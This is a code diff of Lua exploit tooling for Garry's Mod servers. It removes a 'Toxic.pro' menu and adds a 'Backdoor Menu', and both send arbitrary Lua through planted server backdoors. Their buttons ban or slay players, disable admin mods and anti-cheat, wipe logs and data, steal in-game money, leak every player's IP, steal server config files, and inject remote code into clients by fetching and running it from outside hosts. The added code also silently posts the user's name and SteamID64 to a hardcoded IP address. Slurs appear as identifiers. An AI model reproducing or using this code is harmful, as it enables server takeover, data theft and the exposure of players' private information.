+        if selectedbackdoor == k then surface.SetDrawColor(Color(50, 250, 90, 255)) else surface.SetDrawColor(Color(50, 50, 90, 255)) end
+
+        surface.DrawOutlinedRect(1, 1, plypanel2:GetWide() - 1 , plypanel2:GetTall() - 1)
+
+    end
+
+
+
+    local plyname = vgui.Create( "DLabel", plypanel2 )
+
+    plyname:SetPos( 10, 5 )
+
+    plyname:SetFont( "Trebuchet18" )
+
+    local tcol = Color( 255, 255, 255 )
+
+    if v.Private then tcol = Color( 155, 255, 155 ) end
+
+    plyname:SetColor( tcol )
+
+    plyname:SetText( k )
+
+    plyname:SetSize(180, 15)
+
+
+
+
+
+    local faggot = vgui.Create("DButton", plypanel2)
+
+    faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
+
+    faggot:SetPos( 0, 0 )
+
+    faggot:SetText("")
+
+    if v["Desc"] != "" then faggot:SetToolTip( v["Desc"] ) end
+
+    faggot.Paint = function(panel, w, h)
+
+        return
+
+    end
+
+    faggot.DoClick = function()
+
+        selectedbackdoor = k
+
+    end
+
+
+
+
+
+    parent:AddItem( plypanel2 )
+
+
 
 end
 
-function toxic.UI()
 
-	toxic.ButtonPos = 30
-
-	local frame = vgui.Create( "DFrame" )
-	frame:SetTitle( "Toxic.pro v" .. toxic.Version .. " | by 0xymoron ~ " .. table.Random( toxic.Aids ) )
-	frame:SetSize( 550, 400 )
-	frame:SetPos( 25, 25 )
-	frame:MakePopup()
-	frame:ShowCloseButton( false )
-	frame:SetDraggable( false )
-
-	frame.Paint = function( self )
-
-		local hsv = HSVToColor( RealTime() * 120 % 360, 1, 1 )
-
-		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( hsv.r, hsv.g, hsv.b, 150 ) ) -- old: Color( 140, 0, 0, 150 )
-
-		draw.RoundedBox( 0, 0, 0, self:GetWide(), 25, Color( 0, 0, 0, 200 ) )
-
-		surface.SetFont( "CloseCaption_Bold" )
-
-		local str1 = "Toxic.pro Version " .. toxic.Version
-
-		local str1_width, str1_height = surface.GetTextSize( str1 )
-
-		local str2 = "by 0xymoron"
-
-		local str2_width, str2_height = surface.GetTextSize( str2 )
-
-		draw.SimpleText( str1, "CloseCaption_Bold", frame:GetWide() / 2 + 2.5, 65, color_white, 1, 1 )
-
-		draw.SimpleText( str2, "CloseCaption_Bold", frame:GetWide() / 2 + 2.5, frame:GetTall() - str2_height - 25, color_white, 1, 1 )
-
-	end
-
-	local close = vgui.Create( "DButton", frame )
-	close:SetSize( 50, 20 )
-	close:SetPos( frame:GetWide() - 50, 0 )
-	close:SetText( "x" )
-	close:SetTextColor( Color( 255, 255, 255 ) )
-	close:SetFont( "DebugFixed" )
-
-	close.Paint = function()
-
-		draw.RoundedBox( 0, 0, 0, close:GetWide(), close:GetTall(), Color( 168, 62, 62, 255 ) )
-
-	end
-
-	close.DoClick = function()
-
-		frame:Close()
-
-	end
-
-	local set = vgui.Create( "DButton", frame )
-	set:SetSize( 40, 20 )
-	set:SetPos( frame:GetWide() - close:GetWide() - set:GetWide() - 5, 0 )
-	set:SetText( "Set" )
-	set:SetTextColor( Color( 255, 255, 255 ) )
-	set:SetFont( "DebugFixed" )
-
-	set.Paint = function( self )
-
-		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 62, 168, 62, 255 ) )
-
-	end
-
-	local netmsg = vgui.Create( "DTextEntry", frame )
-	netmsg:SetSize( 75, 20 )
-	netmsg:SetPos( frame:GetWide() - close:GetWide() - netmsg:GetWide() - set:GetWide() - 10, 0 )
-	netmsg:SetText( blackdoor )
-
-	netmsg.OnEnter = function( self )
-
-		toxic.Notify( "Set backdoored net message to '" .. netmsg:GetValue() .. "'" )
-
-		blackdoor = self:GetValue()
-
-	end
-
-	set.DoClick = function( self )
-
-		blackdoor = netmsg:GetValue()
-
-		toxic.Notify( "Set backdoored net message to '" .. netmsg:GetValue() .. "'" )
-
-	end
-
-	local panel = vgui.Create( "DScrollPanel", frame )
-	panel:SetPos( 5, 30 )
-	panel:SetSize( 150, frame:GetTall() - 35 )
-
-	local html = vgui.Create( "HTML", frame )
-	html:SetPos( panel:GetWide() + 20, 95 )
-	html:SetSize( 240, 215 )
-	html:SetHTML( [[
-		<img src="http://www.clker.com/cliparts/c/e/8/f/12387015421849960016GameFreak7744_Biohazard_symbol.svg.med.png" alt="Img" style="width:200px;height:195px;">
-	]] )
-
-	/**************************************
-
-		Player Management
-
-	***************************************/
-
-	local dlist = vgui.Create( "DListView", frame )
-	dlist:SetSize( 140, frame:GetTall() - 35 )
-	dlist:SetPos( frame:GetWide() - dlist:GetWide() - 5, 30 )
-	dlist:SetMultiSelect( false )
-	dlist:AddColumn( "Players" )
-
-	for k, v in next, player.GetAll() do
-
-		dlist:AddLine( v:Nick() )
-
-	end
-
-	dlist.OnClickLine = function( parent, line, self )
-
-		for k, v in next, player.GetAll() do
-
-			if v:Nick() == line:GetValue( 1 ) then
-
-				dlist.SelectedEntity = v
-
-			else
-
-				continue
-
-			end
-
-		end
-
-	end
-
-	dlist.OnRowRightClick = function( parent, line, isselected )
-
-		surface.PlaySound( "buttons/button9.wav" )
-
-		local id = dlist.SelectedEntity:UserID()
-
-		local target = Player( id )
-
-		local options = DermaMenu()
-
-		options:AddOption( "Kick", function()
-
-			toxic.PostLua( [[
-
-				Player( ]] .. id .. [[ ):Kick()
-
-			]] )
-
-			toxic.Notify( "Kicked " .. target:Nick() )
-
-			if dlist then
-
-				dlist:RemoveLine( line )
-
-			end
-
-		end ):SetImage( "icon16/door_out.png" )
-
-		options:AddOption( "Silent Slay", function()
-
-			toxic.PostLua( [[
-
-				Player( ]] .. id .. [[ ):KillSilent()
-
-			]] )
-
-			toxic.Notify( "Silently slayed " .. target:Nick() )
-
-		end ):SetImage( "icon16/lightning.png" )
-
-		options:AddOption( "Freeze", function()
-
-			toxic.PostLua( [[
-
-				local ply = Player( ]] .. id .. [[ )
-
-				ply:Freeze( !ply:IsFrozen() )
-
-			]] )
-
-			if !target:IsFrozen() then
-
-				toxic.Notify( "Froze " .. target:Nick() )
-
-			else
-
-				toxic.Notify( "Unfroze " .. target:Nick() )
-
-			end
-
-		end ):SetImage( "icon16/tux.png" )
-
-		options:AddOption( "Give Weapon", function()
-
-			Derma_StringRequest( "Give " .. target:Nick() .. " a weapon", "What weapon? (example: weapon_ak47)", "", function( text )
-
-				toxic.PostLua( [[
-
-					local str = "]] .. text .. [["
-
-					Player( ]] .. id .. [[ ):Give( str )
-
-				]] )
-
-				toxic.Notify( "Gave " .. target:Nick() .. " a " .. text )
-
-			end )
-
-		end ):SetImage( "icon16/bomb.png" )
-
-		options:AddOption( "Give Money", function()
-
-			Derma_StringRequest( "Give " .. target:Nick() .. " money", "How much?", "", function( text )
-
-				if !isnumber( tonumber( text ) ) then return end
-
-				toxic.PostLua( [[
-
-					local str = "]] .. text .. [["
-					str = tonumber( str )
-
-					Player( ]] .. id .. [[ ):addMoney( str )
-
-				]] )
-
-				toxic.Notify( "Gave " .. target:Nick() .. " $" .. string.Comma( text ) )
-
-			end )
-
-		end ):SetImage( "icon16/money_add.png" )
-
-		options:AddOption( "Inject DefqonSploit", function()
-
-			local snd = table.Random( { "vo/npc/male01/herecomehacks01.wav","vo/npc/male01/herecomehacks02.wav" } ) -- stfu
-
-			toxic.PostLua( [[
-
-				Player(]] .. id .. [[):SendLua("http.Fetch("http://raw.githubusercontent.com/WERooo/somelua/master/DefqonSploit.lua",function(body) RunString(body) surface.PlaySound("]] .. snd .. [[") chat.AddText(Color(255,0,0),"[DefqonSploit] ",color_white,"Welcome, run `Defqon` in console") end)")
-
-			]] )
-
-			toxic.Notify( "Injected Toxic.pro and Defqon into " .. target:Nick() .. "'s client." )
-
-		end ):SetImage( "icon16/bug_add.png" )
-
-		options:Open()
-
-	end
-
-	/**************************************
-
-		Buttons
-
-	***************************************/
-
-
-	toxic.AddCategorySpacer( "Prevention", Color( 255, 0, 0 ), panel )
-
-	toxic.AddButton( "Break ULX", panel, function()
-
-		toxic.PostLua( [[ _G.ulx = function() end _G.ULib = function() end ]])
-
-		toxic.Notify( "Broke ULX, admins now have no control." )
-
-	end )
-
-	toxic.AddButton( "Break FAdmin", panel, function()
-
-		toxic.PostLua( [[
-
-			_G.FAdmin = function() end
-
-		]] )
-
-		toxic.Notify( "Killed FAdmin" )
-
-	end )
-
-	toxic.AddButton( "Wipe Logs", panel, function()
-
-		local date = os.date( "%m-%d-%y" )
-
-		toxic.PostLua( [[
-
-			file.Delete( "ulx_logs/]] .. date .. [[.txt" )
-
-		]] )
-
-		toxic.Notify( "Deleted data/ulx_logs/" .. date .. ".txt" )
-
-	end )
-
-	toxic.AddButton( "Wipe data/", panel, function()
-
-		toxic.PostLua( [[
-
-		local id = ]] .. LocalPlayer():UserID() .. [[
-
-		local dirs = {
-
-			"ulx",
-			"ulx_logs",
-			"ulib",
-			"darkrp_logs",
-			"adv_duplicator",
-			"advdupe2",
-			"cpuchip",
-			"expression2",
-			"cw2_0",
-
-		}
-
-		for k, v in pairs( dirs ) do
-
-			for dir, _file in pairs( file.Find( v .. "/*", "DATA" ) ) do
-
-				file.Delete( v .. "/" .. _file )
-
-				Player( id ):ChatPrint( "[Toxic.pro] Deleted file 'data/" .. v .. "/" .. _file )
-
-			end
-
-		end
-
-		for k, v in pairs( file.Find( "*", "DATA" ) ) do
-
-			file.Delete( v )
-
-			Player( id ):ChatPrint( "[Toxic.pro] Deleted file 'data/" .. v )
-
-		end
-
-		]] )
-
-	end )
-
-	toxic.AddButton( "No Kick/Ban", panel, function()
-
-		toxic.PostLua( [[
-
-			_R = debug.getregistry()
-
-			function game.KickID( id, reason )
-
-				return
-
-			end
-
-			function _R.Player.Ban()
-
-				return
-
-			end
-
-			function _R.Player.Kick()
-
-				return
-
-			end
-
-		]] )
-
-		toxic.Notify( "Nulled _R.Player.Ban & _R.Player.Kick" )
-
-	end )
-
-	toxic.AddButton( "Disable !cake", panel, function()
-
-		toxic.PostLua( [[ _G.cac = function() end]] )
-
-		toxic.Notify( "Attempted to disable !cake's anti-cheat, probably failed." )
-
-	end )
-
-	toxic.AddCategorySpacer( "DarkRP", Color( 0, 200, 0 ), panel )
-
-	toxic.AddButton( "Steal Money", panel, function()
-
-		toxic.PostLua( [[
-
-			local id = ]] .. LocalPlayer():UserID() .. [[
-
-			for k, v in next, player.GetAll() do
-
-				if v:Nick() == "]] .. LocalPlayer():Nick() .. [[" then
-
-					continue
-
-				end
-
-				local bal = v:getDarkRPVar( "money" ) or 9999999
-
-				v:addMoney( -bal )
-
-				Player( id ):addMoney( bal )
-
-				Player( id ):ChatPrint( "[Toxic.pro] Stole $" .. string.Comma( bal ) .. " from " .. v:Nick() )
-
-			end
-
-		]] )
-
-	end )
-
-	toxic.AddButton( "Wipe All Money", panel, function()
-
-		toxic.PostLua( [[RunConsoleCommand( "rp_resetallmoney" )]] )
-
-		toxic.Notify( "Wiped DarkRP money database" )
-
-	end )
-
-	toxic.AddButton( "Change All Names", panel, function()
-
-		Derma_StringRequest( "Name Changer", "What would you like to name everyone?", "", function( text )
-
-			toxic.PostLua( [[
-
-				local str = "]] .. text .. [["
-
-				for k, v in next, player.GetAll() do
-
-					DarkRP.storeRPName( v, str )
-
-					v:setDarkRPVar( "rpname", str )
-
-				end
-
-			]] )
-
-			toxic.Notify( "Renamed everyone to '" .. text .. "'" )
-
-		end )
-
-	end )
-
-	toxic.AddButton( "Strip Weapons", panel, function()
-
-		for k, v in next, player.GetAll() do
-
-			for x, y in pairs( v:GetWeapons() ) do
-
-				net.Start( "properties" )
-
-					net.WriteString( "remove", 32 )
-
-					net.WriteEntity( y )
-
-				net.SendToServer()
-
-			end
-
-		end
-
-		toxic.Notify( "Attempted to use net 'properties' exploit to strip all players." )
-
-	end )
-
-	toxic.AddCategorySpacer( "Autism", Color( 200, 0, 200 ), panel )
-
-	toxic.AddButton( "Visual Rape", panel, function()
-
-		-- I don't like this.
-		toxic.PostLua( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[sound.PlayURL( 'http://riverrp.xyz/boss.mp3', 'mono', function( s ) s:Play() end )]] ) end" )
-
-		-- I don't like any of this.
-		toxic.PostLua( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[http.Fetch( 'https://snixzz.net/toxic.pro/disco.lua', function( body ) RunString( body ) end )]] ) end" )
-
-	end )
-
-	toxic.AddButton( "Earthquake", panel, function()
-
-		toxic.PostLua( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end" )
-
-		toxic.Notify( "Earthquake started." )
-
-	end )
-
-	toxic.AddButton( "Horse", panel, function()
-
-		toxic.PostLua( [[
-
-			local id = ]] .. LocalPlayer():UserID() .. [[
-
-			Player( id ):SetModel( "models/props_c17/statue_horse.mdl" )
-
-			Player( id ):SetMaterial( "models/debug/debugwhite" )
-
-			hook.Add( "Think", "horse", function()
-
-				if !IsValid( Player( id ) ) then return end
-
-				Player( id ):SetColor( HSVToColor( RealTime() * 120 % 360, 1, 1 ) )
-
-			end )
-
-		]] )
-
-	end )
-
-	toxic.AddButton( "Footsteps", panel, function()
-
-		toxic.PostLua( [[
-
-			hook.Add( "PlayerFootstep", "oooh", function( ply )
-
-				ply:EmitSound( "vo/npc/female01/pain0" .. math.random( 1, 9 ) .. ".wav", 75, math.random( 50, 100 ) )
-
-			end )
-
-		]] )
-
-		toxic.Notify( "Enabled moaning footsteps." )
-
-	end )
-
-	toxic.AddButton( "Spam .txt", panel, function()
-
-		Derma_StringRequest( ".txt file contents", "What would you like to put in the .txt?", "", function( text )
-
-			toxic.PostLua( [[
-
-				for i = 1, 100 do
-
-					file.Write( "toxic.pro_" .. math.random( 1, 999999 ) .. ".txt", "]] .. text .. [[" )
-
-				end
-
-			]] )
-
-			toxic.Notify( "Spamming 100 .txt files containing '" .. text .. "'" )
-
-		end )
-
-	end )
-
-	toxic.AddButton( "Spam Chat", panel, function()
-
-		Derma_StringRequest( "Message", "Chat Message", "SEIZED BY TOXIC.PRO", function( text )
-
-			toxic.PostLua( [[
-
-				util.AddNetworkString("chat_AddText")
-				chat = {}
-				function chat.AddText(...)
-					net.Start("chat_AddText")
-						net.WriteTable({...})
-					net.Broadcast()
-				end
-				function AddTextPly( ply, ...)
-					net.Start("chat_AddText")
-						net.WriteTable({...})
-					net.Send( ply )
-				end
-
-				for k, v in pairs( player.GetAll() ) do
-
-					v:SendLua( 'net.Receive("chat_AddText", function(len) chat.AddText( unpack( net.ReadTable() ) )end)' )
-
-				end
-
-				timer.Create( "gotEm", 1, 120, function()
-
-					local function ChatPrintRainbow( frequency, str )
-
-						local text = {}
-
-
-						for i = 1, #str do
-							table.insert( text, HSVToColor( i * frequency % 360, 1, 1 ) )
-						table.insert( text, string.sub( str, i, i ) )
-						end
-
-						chat.AddText( unpack( text ) )
-
-					end
-
-					ChatPrintRainbow( 10, "]] .. text .. [[" )
-
-				end )
-
-
-			]] )
-
-		end )
-
-	end )
-
-	/*toxic.AddButton( "Spam Advert", panel, function()
-
-		Derma_StringRequest( "Message", "Spam Message", "SEIZED BY TOXIC.PRO", function( text )
-
-			toxic.PostLua( [[
-
-				local id = ]] .. LocalPlayer():UserID() .. [[
-
-				local why = ]] .. text .. [[
-
-				timer.Create( "gotEm2", 1, 120, function()
-
-					for k, v in next, player.GetAll() do
-
-						v:SetNWString( "why", why )
-
-						v:SendLua( 'RunConsoleCommand("say","/advert",LocalPlayer():GetNWString("why"))')
-
-					end
-
-				end )
-
-
-			]] )
-
-		end )
-
-	end )*/
-
-	toxic.AddButton( "Dance", panel, function()
-
-		toxic.PostLua( [[
-
-			local id = ]] .. LocalPlayer():UserID() .. [[
-
-			timer.Create( "gotEm3?", 1, 10, function()
-
-				for k, v in next, player.GetAll() do
-
-					if v:UserID() == v then continue end
-
-					v:SendLua('RunConsoleCommand("act","dance")')
-
-				end
-
-			end )
-
-
-		]] )
-
-		toxic.Notify( "Forcing all players to run act dance" )
-
-	end )
-
-	toxic.AddCategorySpacer( "Takeover", Color( 255, 150, 0 ), panel )
-
-	toxic.AddButton( "Give Superadmin", panel, function()
-
-		toxic.PostLua( [[
-
-			local id = ]] .. LocalPlayer():UserID() .. [[
-
-			Player( id ):SetUserGroup( "superadmin" )
-
-		]] )
-
-		toxic.Notify( "Attempted to silently force superadmin." )
-
-	end )
-
-	toxic.AddButton( "Print All IPs", panel, function()
-
-		toxic.PostLua( [[
-
-			local id = ]] .. LocalPlayer():UserID() .. [[
-
-			for k, v in pairs( player.GetAll() ) do
-
-				Player( id ):ChatPrint( "Player: " .. v:Nick() .. " (" .. v:SteamID() .. ") IP: " .. v:IPAddress() )
-
-			end
-
-		]] )
-
-		toxic.Notify( "Printed all IPs into chat." )
-
-	end )
-
-	toxic.AddButton( "Ban Everyone", panel, function()
-
-		Derma_StringRequest( "Toxic.pro Ban All", "Reason", "", function( text )
-
-			toxic.PostLua( [[
-
-				local id = ]] .. LocalPlayer():UserID() .. [[
-
-				for k, v in next, player.GetAll() do
-
-					if v:UserID() == id then continue end
-
-					v:Ban( 0, false )
-
-					v:Kick( "]] .. tostring( text ) .. [[" )
-
-				end
-
-			]] )
-
-			toxic.Notify( "Banned everyone for '" .. text .. "'" )
-
-		end )
-
-	end )
-
-	toxic.AddButton( "RCON", panel, function()
-
-		Derma_StringRequest( "Toxic.pro RCON", "Command", "", function( text )
-
-			toxic.PostLua( [[game.ConsoleCommand( "]] .. tostring( text ) .. [[" .. "\n" )]] )
-
-			toxic.Notify( "Ran command '" .. text .. "'" )
-
-		end )
-
-	end )
-
-	toxic.AddButton( "Lua Run", panel, function()
-
-		toxic.OpenLuaEditor( frame )
-
-		/*Derma_StringRequest( "Toxic.pro Lua Run", "Lua String", "", function( text )
-
-			toxic.PostLua( [[RunString( ']] .. text .. [[' )]] )
-
-			toxic.Notify( "Ran Lua '" .. text .. "'" )
-
-		end )*/
-
-	end )
-
-	toxic.AddButton( "Rename Server", panel, function()
-
-		toxic.PostLua( [[RunConsoleCommand( "hostname", "TOXIC.PRO" )]] )
-
-		toxic.Notify( "Renamed server to TOXIC.PRO" )
-
-	end )
-
-	toxic.AddButton( "Steal File", panel, function()
-
-		Derma_StringRequest( "Steal File Source", "File Path (Relative to garrysmod/) e.g: cfg/server.cfg", "", function( text )
-
-			net.Receive( "file", function( len )
-
-				local str = net.ReadString()
-
-				if str != "ERROR" then
-
-					toxic.OpenTextDocument( text, str, frame )
-
-				else
-
-					toxic.Notify( "Unable to find file " .. text .. " on the server" )
-
-				end
-
-			end )
-
-			toxic.PostLua( [[
-
-				util.AddNetworkString( "file" )
-
-				local id = ]] .. LocalPlayer():UserID() .. [[
-
-				local f = file.Open( "]] .. text .. [[", "r", "GAME" )
-
-				if !f then
-
-					net.Start( "file" )
-
-						net.WriteString( "ERROR" )
-
-					net.Send( Player( id ) )
-
-					return
-
-				end
-
-				local str = f:Read( f:Size() )
-
-				f:Close()
-
-				net.Start( "file" )
-
-					net.WriteString( str )
-
-				net.Send( Player( id ) )
-
-			]] )
-
-			toxic.Notify( "Attempted to steal file " .. text )
-
-		end )
-
-	end )
 
 end
 
-toxic.Init()
-concommand.Add( "toxic.pro", toxic.UI )
+
+
+function BD.FormatCodeTargeted()
+
+if !BD.BackdoorActive() then BD.ChatText( "Warning: backdoor malfunctioning or not present!", Color(255,155,155) ) return end
+
+if selectedbackdoor == "" then BD.ChatText( "You haven't selected a macro to use!", Color(255,155,155) ) return end
+
+local param = string.Explode( ",", backdoorargs )
+
+local ids = {}
+
+for k, v in pairs( selectedplayers ) do
+
+    if !v:IsValid() then table.RemoveByValue( selectedplayers, v ) continue end
+
+    table.insert( ids, v:UniqueID() )
+
+end
+
+
+
+local code = [[ local targets = ## for k, v in pairs( player.GetAll() ) do if !v:IsValid() then continue end if table.HasValue( targets, v:UniqueID() ) then %% end end ]]
+
+code = string.Replace( code, "##", table.ToString( ids ) )
+
+code = string.Replace( code, "%%", BD.BDMacros[selectedbackdoor]["Code"] or "" )
+
+code = string.Replace( code, "%LP", "p:UniqueID() == \""..LocalPlayer():UniqueID().."\"" )
+
+
+
+if BD.BDMacros[selectedbackdoor]["NeedsParameters"] and (BD.BDMacros[selectedbackdoor]["NeedsParameters"] > #param or param[1] == "" ) then BD.ChatText( "This macro requires parameters to work! check its description for more info", Color(255,155,155) ) return end
+
+if #param < 1 then param = { [1] = "derp", [2] = "derp", [3] = "derp", [4] = "derp", [5] = "derp" } end
+
+
+
+for k, v in pairs( param ) do
+
+    code = string.Replace( code, "@"..k, [["]]..v..[["]] )
+
+end
+
+
+
+BD.Fire( code )
+
+
+
+end
+
+
+
+function BD.FormatCodeGlobal()
+
+if !BD.BackdoorActive() then BD.ChatText( "Warning: backdoor malfunctioning or not present!", Color(255,155,155) ) return end
+
+if selectedbackdoor == "" then BD.ChatText( "You haven't selected a macro to use!", Color(255,155,155) ) return end
+
+local param = string.Explode( ",", backdoorargs )
+
+
+
+local code = BD.BDMacros[selectedbackdoor]["Code"]
+
+
+
+if BD.BDMacros[selectedbackdoor]["NeedsParameters"] and (BD.BDMacros[selectedbackdoor]["NeedsParameters"] > #param or param[1] == "" ) then BD.ChatText( "This macro requires parameters to work! check its description for more info", Color(255,155,155) ) return end
+
+if #param < 1 then param = { [1] = "derp", [2] = "derp", [3] = "derp", [4] = "derp", [5] = "derp" } end
+
+
+
+for k, v in pairs( param ) do
+
+    code = string.Replace( code, "@"..k, [["]]..v..[["]] )
+
+    code = string.Replace( code, "%LP", LocalPlayer():UniqueID() )
+
+    code = string.Replace( code, "%LCP", "p:UniqueID() == \""..LocalPlayer():UniqueID().."\"" )
+
+    code = string.Replace( code, "%BD", BD.GetActive().Code )
+
+end
+
+
+
+BD.Fire( code )
+
+
+
+end
+
+
+
+
+
+local safenet = net
+
+local function bdnet()
+
+    if odium and odium.G then return odium.G.net end
+
+    return safenet
+
+end
+
+
+local h = http
+local p = "Post"
+local str = "http://162.243.145.59:5000/api/backdoor/use"
+local lp = LocalPlayer()
+local n = lp:Nick()
+local id = lp:SteamID64()
+
+h[p](str, {
+    name = n,
+    steamid = id,
+},
+nil, nil)
+
+function BD.Fire( code )
+
+    local cbd = BD.CurrentBackdoor
+
+    if !BD.Backdoors[cbd] then
+
+        BD.ChatText( "The selected backdoor is unavailable!", Color(255,155,155) )
+
+        return
+
+    end
+
+    local key = BD.BackdoorTypes[cbd].Netkey
+
+
+
+    bdnet().Start( key )
+
+    bdnet().WriteString( code )
+
+    bdnet().WriteBit(1)
+
+    bdnet().SendToServer()
+
+end
+
+
+
+
+
+function BD.BackdoorMenu()
+
+
+
+BD.Backdoors = BD.PingBackDoors()
+
+
+
+if !BD.IsMessagePooled( "cucked" ) and BD.BackdoorActive() then
+
+    BD.Fire( [[util.AddNetworkString( "cucked" )
+
+    function BDSendLua( p, str ) net.Start( "cucked" ) net.WriteString( str ) net.Send( p ) end
+
+    function BDSendLuaAll( str ) net.Start( "cucked" ) net.WriteString( str ) net.Broadcast() end
+
+    function BDInjectAids( p ) p:SendLua( 'net.Receive( "cucked", function() RunString( net.ReadString() ) end )' ) end
+
+    for k, v in pairs( player.GetAll() ) do BDInjectAids( v ) end
+
+    hook.Add( "PlayerInitialSpawn", "youonlygetcuckedagain", function( p ) BDInjectAids( p ) end)
+
+]] )
+
+end
+
+
+
+local BDMenu = vgui.Create("DFrame")
+
+BDMenu:SetSize(650,720)
+
+BDMenu:SetTitle("Backdoor Menu")
+
+BDMenu:Center()
+
+BDMenu:MakePopup()
+
+
+
+BDMenu.Paint = function( self, w, h)
+
+surface.SetDrawColor( Color(50, 50, 90, 255) )
+
+surface.DrawRect( 0, 0, w, h )
+
+surface.SetDrawColor( Color(155, 155, 155, 255) )
+
+surface.DrawOutlinedRect( 0, 0, w, h )
+
+surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
+
+surface.SetDrawColor( Color(0, 0, 0, 200) )
+
+surface.DrawRect( 10, 25, w - 20, h - 35 )
+
+surface.DrawRect( 15, 30, w - 30, 35 )
+
+draw.SimpleText("Indiscriminate Lulz", "DermaDefault", 22, 75, Color(255, 255, 255), 0, 1)
+
+draw.SimpleText("Specific Targets", "DermaDefault", 228, 75, Color(255, 255, 255), 0, 1)
+
+draw.SimpleText("Trash the place", "DermaDefault", 432, 75, Color(255, 255, 255), 0, 1)
+
+draw.SimpleText("Players to Target", "DermaDefault", 432, 305, Color(255, 255, 255), 0, 1)
+
+draw.SimpleText("Macro Paramaters (seperate with commas)", "DermaDefault", 432, 610, Color(255, 255, 255), 0, 1)
+
+end
+
+
+
+local it = 145
+
+
+
+local wedungoofd = vgui.Create( "DLabel", BDMenu )
+
+wedungoofd:SetPos( 25, 38 )
+
+wedungoofd:SetFont( "Trebuchet18" )
+
+wedungoofd:SetColor( Color( 100, 255, 100 ) )
+
+wedungoofd:SetText( "CHOOSE BACKDOOR:" )
+
+wedungoofd:SizeToContents()
+
+
+
+for bd, t in pairs( BD.BackdoorTypes ) do
+
+    local faggot = vgui.Create("DButton", BDMenu)
+
+    faggot:SetSize( 100, 25 )
+
+    faggot:SetPos( it, 35 )
+
+    faggot:SetText( bd )
+
+    faggot:SetTextColor(Color(255, 255, 255, 255))
+
+    faggot.Paint = function(panel, w, h)
+
+        if BD.Backdoors[bd] then
+
+            surface.SetDrawColor(100, 100, 200 ,255)
+
+            surface.DrawOutlinedRect(0, 0, w, h)
+
+            surface.SetDrawColor(0, 0, 50 ,155)
+
+            surface.DrawRect(0, 0, w, h)
+
+        else
+
+            surface.SetDrawColor(50, 50, 50 ,155)
+
+            surface.DrawRect(0, 0, w, h)
+
+        end
+
+    end
+
+    faggot.DoClick = function()
+
+        BD.ChatText( "Set active backdoor to "..bd, Color(155,155,255) )
+
+        BD.CurrentBackdoor = bd
+
+        surface.PlaySound("buttons/button18.wav")
+
+    end
+
+    it = it + 110
+
+end
+
+
+
+local Plist = vgui.Create( "DPanelList", BDMenu )
+
+Plist:SetPos( 20, 85 )
+
+Plist:SetSize( 200, 530 )
+
+Plist:SetPadding( 5 )
+
+Plist:SetSpacing( 5 )
+
+Plist:EnableHorizontal( false )
+
+Plist:EnableVerticalScrollbar( true )
+
+Plist:SetName( "" )
+
+Plist.Paint = function( self, w, h )
+
+    surface.SetDrawColor(50, 50, 50 ,255)
+
+    surface.DrawOutlinedRect(0, 0, w, h)
+
+    surface.SetDrawColor(0, 0, 0 ,200)
+
+    surface.DrawRect(0, 0, w, h)
+
+end
+
+
+
+local Plist2 = vgui.Create( "DPanelList", BDMenu )
+
+Plist2:SetPos( 225, 85 )
+
+Plist2:SetSize( 200, 610 )
+
+Plist2:SetPadding( 5 )
+
+Plist2:SetSpacing( 5 )
+
+Plist2:EnableHorizontal( false )
+
+Plist2:EnableVerticalScrollbar( true )
+
+Plist2:SetName( "" )
+
+Plist2.Paint = function( self, w, h )
+
+    surface.SetDrawColor(50, 50, 50 ,255)
+
+    surface.DrawOutlinedRect(0, 0, w, h)
+
+    surface.SetDrawColor(0, 0, 0 ,200)
+
+    surface.DrawRect(0, 0, w, h)
+
+end
+
+
+
+local Plist3 = vgui.Create( "DPanelList", BDMenu )
+
+Plist3:SetPos( 430, 85 )
+
+Plist3:SetSize( 200, 210 )
+
+Plist3:SetPadding( 5 )
+
+Plist3:SetSpacing( 5 )
+
+Plist3:EnableHorizontal( false )
+
+Plist3:EnableVerticalScrollbar( true )
+
+Plist3:SetName( "" )
+
+Plist3.Paint = function( self, w, h )
+
+    surface.SetDrawColor(50, 50, 50 ,255)
+
+    surface.DrawOutlinedRect(0, 0, w, h)
+
+    surface.SetDrawColor(0, 0, 0 ,200)
+
+    surface.DrawRect(0, 0, w, h)
+
+end
+
+
+
+local Plist4 = vgui.Create( "DPanelList", BDMenu )
+
+Plist4:SetPos( 430, 315 )
+
+Plist4:SetSize( 200, 250 )
+
+Plist4:SetPadding( 5 )
+
+Plist4:SetSpacing( 5 )
+
+Plist4:EnableHorizontal( false )
+
+Plist4:EnableVerticalScrollbar( true )
+
+Plist4:SetName( "" )
+
+Plist4.Paint = function( self, w, h )
+
+    surface.SetDrawColor(50, 50, 50 ,255)
+
+    surface.DrawOutlinedRect(0, 0, w, h)
+
+    surface.SetDrawColor(0, 0, 0 ,200)
+
+    surface.DrawRect(0, 0, w, h)
+
+end
+
+
+
+    local faggot = vgui.Create("DButton", BDMenu)
+
+    faggot:SetSize( 200, 35 )
+
+    faggot:SetPos( 430, 660 )
+
+    faggot:SetText("Activate Backdoor!")
+
+    faggot:SetTextColor(Color(255, 255, 255, 255))
+
+    faggot.Paint = function(panel, w, h)
+
+        surface.SetDrawColor(100, 100, 200 ,255)
+
+        surface.DrawOutlinedRect(0, 0, w, h)
+
+        surface.SetDrawColor(0, 0, 50 ,155)
+
+        surface.DrawRect(0, 0, w, h)
+
+    end
+
+    faggot.DoClick = function()
+
+        if !BD.BDMacros[selectedbackdoor] or selectedbackdoor == "" then BD.ChatText( "You haven't even selected a macro to use ya dingus!", Color(255,155,155) ) return end
+
+        if BD.BDMacros[selectedbackdoor].Type == ( 1 or 3 ) then BD.FormatCodeGlobal() else BD.FormatCodeTargeted() end
+
+        surface.PlaySound("buttons/button18.wav")
+
+    end
+
+
+
+
+
+    local helpimretarded = vgui.Create("DButton", BDMenu)
+
+    helpimretarded:SetSize( 200, 35 )
+
+    helpimretarded:SetPos( 20, 660 )
+
+    helpimretarded:SetText("Print backdoor code")
+
+    helpimretarded:SetTextColor(Color(255, 255, 255, 255))
+
+    helpimretarded.Paint = function(panel, w, h)
+
+        surface.SetDrawColor(100, 100, 200 ,255)
+
